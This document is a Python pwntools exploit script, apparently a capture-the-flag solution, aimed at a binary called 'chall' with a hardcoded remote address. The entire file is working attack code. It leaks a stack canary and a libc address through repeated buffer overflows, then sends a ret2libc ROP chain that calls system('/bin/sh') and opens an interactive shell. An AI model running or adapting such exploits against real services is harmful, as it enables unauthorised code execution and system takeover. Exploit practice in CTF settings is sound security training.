from pwn import *
import sys
remote_addr = ["45.153.243.57",1337]
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./chall')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./chall")
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 0

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)

debug('''
    b *$rebase(0x1256)
''')

sla(b'How much???\n', str(0x100).encode())
payload = b'a' * (0x48) + b'b'
sa(b'content\n', payload)

ru(b'\x62')
canary = u64(rc(7).ljust(8, b'\x00')) << 8
pr('canary', canary)

sla(b'again?', str(1337).encode())

sla(b'How much???\n', str(0x100).encode())
payload = b'a' * (0x48) + p64(canary + 1) + b'a' * 8 + b'b'
sa(b'content\n', payload)
libc.address = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x29d62
pr('libc.address', libc.address)
pop_rdi = libc.address + 0x2a3e5
system = libc.sym['system']
binsh = next(libc.search(b'/bin/sh\x00'))
ret = libc.address + 0x29cd6

sla(b'again?', str(1337).encode())

sla(b'How much???\n', str(0x100).encode())
payload = b'a' * (0x48) + p64(canary) + b'a' * 8 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
sa(b'content\n', payload)

sla(b'again?', str(0).encode())

shell()
